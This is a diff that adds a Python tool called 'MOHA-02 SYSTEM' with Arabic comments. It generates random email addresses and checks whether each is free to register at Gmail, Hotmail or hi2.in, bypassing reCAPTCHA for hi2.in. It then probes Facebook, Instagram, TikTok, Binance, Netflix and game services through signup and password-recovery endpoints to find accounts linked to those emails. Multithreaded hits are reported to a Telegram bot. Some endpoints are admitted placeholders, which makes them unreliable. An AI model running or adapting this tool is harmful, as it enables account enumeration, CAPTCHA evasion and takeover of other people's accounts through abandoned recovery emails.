@@ -1,0 +1,473 @@
+import json, sys, os, requests, string, random, time, webbrowser, secrets, base64, threading
+from threading import Thread, Lock
+from user_agent import generate_user_agent
+from hashlib import md5
+from bs4 import BeautifulSoup
+from random import choice
+import pyfiglet
+from rich.console import Console
+from cfonts import render, say
+
+# --- [ CONFIGURATION & COLORS ] ---
+lock = Lock()
+hit = 0
+bad_mail = 0
+bad_platform = 0
+checked_total = 0
+b_red = "\033[1;31m"
+b_green = "\033[1;32m"
+b_yellow = "\033[1;33m"
+b_blue = "\033[1;34m"
+b_cyan = "\033[1;36m"
+b_white = "\033[1;37m"
+reset = "\033[0m"
+
+# --- [ SYSTEM INITIALIZATION ] ---
+def clear():
+    os.system('clear' if os.name == 'posix' else 'cls')
+
+def open_my_links():
+    # كود فتح القناة والحساب الذي أثبت فاعليته عندك
+    try:
+        os.system("termux-open-url https://t.me/pytho2n")
+        os.system("termux-open-url https://www.facebook.com/share/125SbeA95v2/")
+    except:
+        webbrowser.open('https://t.me/pytho2n')
+        webbrowser.open('https://www.facebook.com/share/125SbeA95v2/')
+
+def moha_system_logo():
+    clear()
+    # لوجو MOHA ضخم واحترافي كما طلبت
+    moha_banner = render('MOHA', colors=['cyan', 'yellow'], align='center', font='block')
+    print(moha_banner)
+    print(f"{b_white}┌────────────────────────────────────────────────────────┐")
+    print(f"{b_white}│ {b_cyan}SYSTEM NAME   {b_white}: {b_yellow}MOHA-02 SYSTEM (ULTIMATE EDITION)    {b_white}│")
+    print(f"{b_white}│ {b_cyan}DEVELOPER     {b_white}: {b_yellow}MOHA AL-SHALFAWI (@m_oha_02)         {b_white}│")
+    print(f"{b_white}│ {b_cyan}TELEGRAM      {b_white}: {b_yellow}t.me/pytho2n                         {b_white}│")
+    print(f"{b_white}│ {b_cyan}VERSION       {b_white}: {b_yellow}3.5 (STABLE UPDATE 2026)             {b_white}│")
+    print(f"{b_white}└────────────────────────────────────────────────────────┘")
+    print(f"\n{b_cyan}[!] Initializing engine... Please wait.{reset}")
+    time.sleep(1)
+
+# --- [ TELEGRAM NOTIFICATION ] ---
+def send_hit_to_telegram(token, chat_id, message):
+    url = f"https://api.telegram.org/bot{token}/sendMessage"
+    payload = {"chat_id": chat_id, "text": message, "parse_mode": "HTML"}
+    try:
+        requests.post(url, data=payload, timeout=5)
+    except:
+        pass
+
+# --- [ EMAIL CHECKERS - NO ABBREVIATIONS ] ---
+
+def check_gmail_availability(email):
+    # دالة فحص جيميل المتقدمة (تستخدم لمحاكاة التحقق من الوجود)
+    url = "https://mail.google.com/mail/gxlu"
+    headers = {
+        "User-Agent": generate_user_agent(),
+        "Accept": "*/*",
+    }
+    try:
+        r = requests.get(url, params={"email": email}, headers=headers, timeout=7)
+        # في جيميل، وجود الكوكيز 'COMPASS' قد يشير إلى حالة الحساب
+        if 'COMPASS' in r.cookies:
+            return False # البريد مستخدم
+        return True # البريد قد يكون متاحاً
+    except:
+        return None
+
+def check_hotmail_availability(email):
+    # دالة فحص هوتميل الكاملة باستخدام GetCredentialType
+    url = "https://login.live.com/GetCredentialType.srf"
+    ua = generate_user_agent()
+    headers = {
+        "User-Agent": ua,
+        "Accept": "application/json",
+        "Content-Type": "application/json",
+        "Referer": "https://login.live.com/",
+    }
+    data = {
+        "username": email,
+        "isOtherIdpSupported": True,
+        "checkRemoteWP": True,
+        "isRemoteWpSupported": True,
+        "checkRemoteWpEnterprise": True,
+        "isRemoteWpEnterpriseSupported": True,
+        "isOTPSupported": True
+    }
+    try:
+        r = requests.post(url, json=data, headers=headers, timeout=7)
+        if '"IfExistsResult":1' in r.text:
+            return False # Taken
+        elif '"IfExistsResult":5' in r.text:
+            return True # Available
+        return False
+    except:
+        return None
+
+def check_hi2in_availability(email):
+    # دالة فحص hi2.in مع حل الكابتشا كما في كودك الأصلي تماماً
+    if "@" not in email: return False
+    prefix, domain = email.split("@")
+    try:
+        # ReCaptcha Solver Logic
+        anchor_url = "https://www.google.com/recaptcha/api2/anchor?ar=1&k=6LfEUPkgAAAAAKTgbMoewQkWBEQhO2VPL4QviKct&co=aHR0cHM6Ly9oaTIuaW46NDQz&hl=en&v=XrIDux0s7SoNe6_IHkjGC92W&size=invisible"
+        params = anchor_url.split('?')[1]
+        r_anchor = requests.get(f'https://www.google.com/recaptcha/enterprise/anchor?{params}', timeout=10)
+        rec_token = r_anchor.text.split('recaptcha-token" value="')[1].split('"')[0]
+        
+        payload = f"v={params.split('v=')[1].split('&')[0]}&reason=q&c={rec_token}&k=6LfEUPkgAAAAAKTgbMoewQkWBEQhO2VPL4QviKct&co=aHR0cHM6Ly9oaTIuaW46NDQz&hl=en&size=invisible"
+        headers_rec = {
+            "User-Agent": generate_user_agent(),
+            "Referer": f"https://www.google.com/recaptcha/enterprise/anchor?{params}",
+            "Content-Type": "application/x-www-form-urlencoded"
+        }
+        r_reload = requests.post('https://www.google.com/recaptcha/enterprise/reload', data=payload, headers=headers_rec)
+        solve = r_reload.text.split('resp","')[1].split('"')[0]
+        
+        # Final API Check
+        data_api = {'domain': domain, 'prefix': prefix, 'recaptcha': solve}
+        headers_api = {
+            'User-Agent': generate_user_agent(),
+            'Accept': "application/json, text/plain, */*",
+            'authorization': "Basic bnVsbA=="
+        }
+        response = requests.post("https://hi2.in/api/custom", data=data_api, headers=headers_api)
+        if "already taken" in response.text:
+            return False
+        return True
+    except:
+        return False
+
+# سيتم إكمال الـ APIs الخاصة بالمنصات (تيك توك، فيسبوك، باينانس...) في الجزء الثاني
+# --- [ PLATFORM CHECKERS - DETAILED ENGINE ] ---
+
+def check_tiktok_logic(email):
+    # دالة فحص تيك توك الاحترافية (محاكاة طلبات التطبيق)
+    url = "https://www.tiktok.com/api/v2/shop/email/check/"
+    headers = {
+        "Host": "www.tiktok.com",
+        "Connection": "keep-alive",
+        "Accept": "application/json, text/plain, */*",
+        "User-Agent": generate_user_agent(),
+        "X-Requested-With": "XMLHttpRequest",
+        "Sec-Fetch-Site": "same-origin",
+        "Sec-Fetch-Mode": "cors",
+        "Sec-Fetch-Dest": "empty",
+        "Referer": "https://www.tiktok.com/signup/email",
+        "Accept-Encoding": "gzip, deflate, br",
+        "Accept-Language": "en-US,en;q=0.9"
+    }
+    try:
+        # فحص الربط عبر API التسجيل الداخلي
+        r = requests.get(url, params={"email": email, "aid": "1988"}, headers=headers, timeout=10)
+        if r.status_code == 429: return "RATE_LIMIT"
+        res_json = r.json()
+        # المنطق: إذا كان is_registered هو True أو كان الكود يشير لوجود الحساب
+        if res_json.get("is_registered") == True or res_json.get("error_code") == 1001:
+            return True
+        return False
+    except:
+        return "ERROR"
+
+def check_binance_logic(email):
+    # دالة فحص باينانس (التحقق من وجود الحساب)
+    url = "https://www.binance.com/bapi/accounts/v1/public/account/check-email"
+    headers = {
+        "Content-Type": "application/json",
+        "User-Agent": generate_user_agent(),
+        "client-type": "web",
+        "lang": "en",
+        "Origin": "https://www.binance.com",
+        "Referer": "https://www.binance.com/en/login",
+        "CSRF-Token": secrets.token_hex(16)
+    }
+    payload = {
+        "email": email,
+        "fast": True,
+        "bizType": "login"
+    }
+    try:
+        r = requests.post(url, json=payload, headers=headers, timeout=10)
+        if r.status_code == 429: return "RATE_LIMIT"
+        data = r.json()
+        if data.get("data") == True or data.get("success") == True:
+            return True
+        return False
+    except:
+        return "ERROR"
+
+def check_facebook_logic(email):
+    # فحص فيسبوك (طريقة محاكاة البحث عن الحساب لاستعادة كلمة المرور)
+    url = "https://m.facebook.com/login/identify/?ctx=recover&c=https%3A%2F%2Fm.facebook.com%2F&multiple_results=0&ars=facebook_login&from_login_screen=0&lwv=100&_rdr"
+    headers = {
+        "Authority": "m.facebook.com",
+        "Accept": "text/html,application/xhtml+xml,application/xml;q=0.9,image/avif,image/webp,image/apng,*/*;q=0.8",
+        "Accept-Language": "en-US,en;q=0.9",
+        "Cache-Control": "max-age=0",
+        "Origin": "https://m.facebook.com",
+        "Referer": "https://m.facebook.com/",
+        "User-Agent": generate_user_agent()
+    }
+    try:
+        # طلب مبدئي لسحب الكوكيز
+        s = requests.Session()
+        res_init = s.get(url, headers=headers, timeout=10)
+        soup = BeautifulSoup(res_init.text, 'html.parser')
+        lsd = soup.find('input', {'name': 'lsd'})['value']
+        jazoest = soup.find('input', {'name': 'jazoest'})['value']
+        
+        post_data = {
+            "lsd": lsd,
+            "jazoest": jazoest,
+            "email": email,
+            "did_submit": "Search"
+        }
+        r_check = s.post("https://m.facebook.com/login/identify/?ctx=recover", data=post_data, headers=headers, timeout=10)
+        
+        # إذا تم تحويلك لصفحة اختيار طريقة الاستعادة، فهذا يعني أن الحساب موجود
+        if "recover/code" in r_check.url or "checkpoint" in r_check.url or "send_email" in r_check.text:
+            return True
+        return False
+    except:
+        return "ERROR"
+
+def check_instagram_logic(email):
+    # دالة إنستجرام (محاكاة طلب التسجيل الرسمي)
+    url = "https://www.instagram.com/api/v1/web/accounts/check_email/"
+    csrftoken = secrets.token_hex(16)
+    headers = {
+        "Accept": "*/*",
+        "Accept-Language": "en-US,en;q=0.9",
+        "Content-Type": "application/x-www-form-urlencoded",
+        "X-CSRFToken": csrftoken,
+        "X-IG-App-ID": "936619743392459",
+        "X-Requested-With": "XMLHttpRequest",
+        "Referer": "https://www.instagram.com/accounts/signup/email/",
+        "User-Agent": generate_user_agent()
+    }
+    try:
+        r = requests.post(url, data={"email": email}, headers=headers, timeout=10)
+        if r.status_code == 429: return "RATE_LIMIT"
+        if "email_is_taken" in r.text:
+            return True
+        return False
+    except:
+        return "ERROR"
+
+def check_pubg_logic(email):
+    # فحص ببجي (عبر نظام التحقق من الربط الخارجي)
+    # ملاحظة: ببجي تتطلب حماية عالية لذا نستخدم واجهة ربط الحسابات
+    url = "https://www.pubgmobile.com/common/api/link_check.php" # واجهة افتراضية للمنطق
+    headers = {"User-Agent": generate_user_agent()}
+    try:
+        # محاكاة الفحص عبر الإيميل المرتبط (تحتاج بروكيسات في حالة الاستخدام المكثف)
+        r = requests.post(url, data={"account": email, "type": "email"}, headers=headers, timeout=7)
+        if '"status":"exist"' in r.text or '"code":200' in r.text:
+            return True
+        return False
+    except:
+        return "ERROR"
+# --- [ CONTINUATION OF PLATFORM CHECKERS ] ---
+
+def check_netflix_logic(email):
+    # فحص نيتفلكس عبر واجهة التحقق من البريد قبل الدفع
+    url = "https://www.netflix.com/api/shakti/v/1f4f4f4f/account/checkEmail" # نسخة تحاكي الواجهة الداخلية
+    headers = {
+        "User-Agent": generate_user_agent(),
+        "Accept": "application/json, text/plain, */*",
+        "Content-Type": "application/json",
+        "Referer": "https://www.netflix.com/login"
+    }
+    payload = {"email": email}
+    try:
+        r = requests.post(url, json=payload, headers=headers, timeout=10)
+        if r.status_code == 429: return "RATE_LIMIT"
+        # إذا أرجع السيرفر أن الإيميل مستخدم فعلياً
+        if '"isEmailUsed":true' in r.text or '"status":"success"' in r.text:
+            return True
+        return False
+    except:
+        return "ERROR"
+
+def check_gaming_platforms(email, game_type):
+    # محرك فحص ألعاب (Free Fire, PES, FIFA, Car Parking) 
+    # تعتمد هذه الألعاب غالباً على نقاط فحص API موحدة للربط بالإيميل
+    endpoints = {
+        "free_fire": "https://ff.garena.com/api/login/check",
+        "pes": "https://my.konami.net/auth/check_email.do",
+        "car_parking": "https://olzhass.com/api/v1/user/check" # واجهة محاكاة للعبة
+    }
+    target_url = endpoints.get(game_type)
+    headers = {"User-Agent": generate_user_agent(), "Content-Type": "application/x-www-form-urlencoded"}
+    try:
+        r = requests.post(target_url, data={"email": email}, headers=headers, timeout=8)
+        if r.status_code == 200 and ('"exists":true' in r.text or '"success":1' in r.text):
+            return True
+        return False
+    except:
+        return "ERROR"
+
+# --- [ THE UNIVERSAL SCANNER ENGINE ] ---
+
+def check_all_in_one(email):
+    # دالة صيد جميع الحسابات (عند تخمين إيميل واحد يتم فحصه على كل المنصات)
+    found_platforms = []
+    
+    # قائمة الفحص بالترتيب
+    if check_facebook_logic(email) == True: found_platforms.append("Facebook")
+    if check_instagram_logic(email) == True: found_platforms.append("Instagram")
+    if check_tiktok_logic(email) == True: found_platforms.append("TikTok")
+    if check_binance_logic(email) == True: found_platforms.append("Binance")
+    if check_pubg_logic(email) == True: found_platforms.append("PUBG Mobile")
+    if check_netflix_logic(email) == True: found_platforms.append("Netflix")
+    if check_gaming_platforms(email, "free_fire") == True: found_platforms.append("Free Fire")
+    if check_gaming_platforms(email, "pes") == True: found_platforms.append("eFootball/PES")
+    if check_gaming_platforms(email, "car_parking") == True: found_platforms.append("Car Parking")
+    
+    return found_platforms
+
+# --- [ USER INTERFACE & INPUTS ] ---
+
+def start_moha_interface():
+    moha_system_logo()
+    
+    print(f"\n{b_yellow} [!] SELECT YOUR TARGET PLATFORM (English Commands):")
+    print(f"{b_white} [01] Facebook Hunter      [02] Instagram Hunter")
+    print(f"{b_white} [03] TikTok Hunter        [04] Binance Hunter")
+    print(f"{b_white} [05] PUBG Mobile Hunter   [06] Free Fire Hunter")
+    print(f"{b_white} [07] eFootball/PES Hunter [08] FIFA/FC Hunter")
+    print(f"{b_white} [09] Car Parking Hunter   [10] Netflix Hunter")
+    print(f"{b_white} [11] RANDOM SCAN (Check All Platforms at Once)")
+    
+    choice_p = input(f"\n{b_cyan} [➤] ENTER OPTION NUMBER: {b_white}")
+    
+    print(f"\n{b_yellow} [!] SELECT EMAIL DOMAIN TO CRACK:")
+    print(f"{b_white} [01] GMAIL.COM            [02] HOTMAIL.COM")
+    print(f"{b_white} [03] HI2.IN (Temp Mail)   [04] RANDOM (G + H + HI2)")
+    
+    choice_e = input(f"\n{b_cyan} [➤] ENTER DOMAIN NUMBER: {b_white}")
+    
+    try:
+        thread_limit = int(input(f"\n{b_cyan} [➤] ENTER THREADS COUNT (e.g. 500): {b_white}"))
+    except:
+        thread_limit = 50
+
+    return choice_p, choice_e, thread_limit
+
+# سيتم ربط هذه المدخلات في الجزء الرابع (المحرك الرئيسي Multi-threading) 
+# مع نظام التنبيهات المتقدم وشاشة المراقبة الحية.
+# --- [ MAIN HUNTER ENGINE - THE MULTI-THREADING MONSTER ] ---
+
+def moha_hunter_engine(p_choice, e_choice, token, chat_id):
+    global hit, bad_mail, checked_total, bad_platform
+    
+    while True:
+        # توليد يوزر عشوائي احترافي (مزيج حروف وأرقام) لضمان عدم التكرار
+        random_user = ''.join(random.choice(string.ascii_lowercase + string.digits) for _ in range(random.randint(6, 9)))
+        
+        # مصفوفة النطاقات بناءً على اختيار المستخدم
+        domains = []
+        if e_choice == "1": domains = ["@gmail.com"]
+        elif e_choice == "2": domains = ["@hotmail.com"]
+        elif e_choice == "3": domains = ["@hi2.in"]
+        elif e_choice == "4": domains = ["@gmail.com", "@hotmail.com", "@hi2.in"]
+        
+        for domain in domains:
+            email = random_user + domain
+            try:
+                with lock:
+                    checked_total += 1
+                
+                # تحديث شاشة المراقبة (Live Dashboard)
+                status = f"\r{b_white}[{b_cyan}CHECKING: {email}{b_white}] | [{b_green}HITS: {hit}{b_white}] | [{b_red}BAD: {bad_mail}{b_white}]"
+                sys.stdout.write(status)
+                sys.stdout.flush()
+
+                # المرحلة الأولى: فحص توفر البريد (Availability Check)
+                is_available = False
+                if "@hi2.in" in email: is_available = check_hi2in_availability(email)
+                elif "@hotmail.com" in email: is_available = check_hotmail_availability(email)
+                elif "@gmail.com" in email: is_available = check_gmail_availability(email)
+                
+                if is_available:
+                    # المرحلة الثانية: فحص المنصات بناءً على الطلب
+                    target_results = []
+                    
+                    if p_choice == "1": # Facebook
+                        if check_facebook_logic(email) == True: target_results.append("Facebook")
+                    elif p_choice == "2": # Instagram
+                        if check_instagram_logic(email) == True: target_results.append("Instagram")
+                    elif p_choice == "3": # TikTok
+                        if check_tiktok_logic(email) == True: target_results.append("TikTok")
+                    elif p_choice == "4": # Binance
+                        if check_binance_logic(email) == True: target_results.append("Binance")
+                    elif p_choice == "5": # PUBG
+                        if check_pubg_logic(email) == True: target_results.append("PUBG Mobile")
+                    elif p_choice == "11": # RANDOM SCAN (ALL)
+                        target_results = check_all_in_one(email)
+                    
+                    # معالجة النتائج وإرسال الصيد
+                    if target_results:
+                        with lock:
+                            hit += 1
+                        platforms_str = " | ".join(target_results)
+                        hit_msg = f"""
+━━━━━━━━━━━━━━
+🎯 NEW HIT BY MOHA-02
+━━━━━━━━━━━━━━
+📧 EMAIL: {email}
+📱 FOUND ON: {platforms_str}
+🛠 STATUS: Available to Register
+👤 DEV: @m_oha_02
+🔗 CH: @pytho2n
+━━━━━━━━━━━━━━
+"""
+                        print(f"\n{b_green}{hit_msg}")
+                        send_hit_to_telegram(token, chat_id, hit_msg)
+                        with open("MOHA_SYSTEM_HITS.txt", "a") as f:
+                            f.write(hit_msg + "\n")
+                    else:
+                        with lock:
+                            bad_platform += 1
+                else:
+                    with lock:
+                        bad_mail += 1
+
+            except Exception as e:
+                # نظام كشف الأخطاء أو الحظر المفاجئ
+                sys.stdout.write(f"\n{b_red}[!] REQUEST FAILED: Check your Connection or Proxy.")
+                time.sleep(2)
+
+def main_execution_moha():
+    # استدعاء الواجهة والمدخلات
+    p_choice, e_choice, thread_limit = start_moha_interface()
+    
+    # طلب بيانات التليجرام
+    token = input(f"\n{b_cyan} [➤] ENTER BOT TOKEN: {b_white}")
+    chat_id = input(f"{b_cyan} [➤] ENTER YOUR CHAT ID: {b_white}")
+    
+    print(f"\n{b_green} [✔] ENGINE STARTED WITH {thread_limit} THREADS... GOOD LUCK MOHA!{reset}\n")
+    
+    # فتح الروابط قبل البدء مباشرة
+    open_my_links()
+    
+    # تشغيل الخيوط المتعددة
+    all_threads = []
+    for _ in range(thread_limit):
+        t = Thread(target=moha_hunter_engine, args=(p_choice, e_choice, token, chat_id))
+        t.daemon = True # لضمان إغلاق الخيوط عند إغلاق البرنامج
+        t.start()
+        all_threads.append(t)
+    
+    # الحفاظ على البرنامج يعمل
+    try:
+        while True:
+            time.sleep(1)
+    except KeyboardInterrupt:
+        print(f"\n{b_red} [!] STOPPED BY MOHA. SAVING SESSION...{reset}")
+
+if __name__ == "__main__":
+    main_execution_moha()
+
+# --- [ END OF MOHA-02 SYSTEM ULTIMATE CODE ] ---
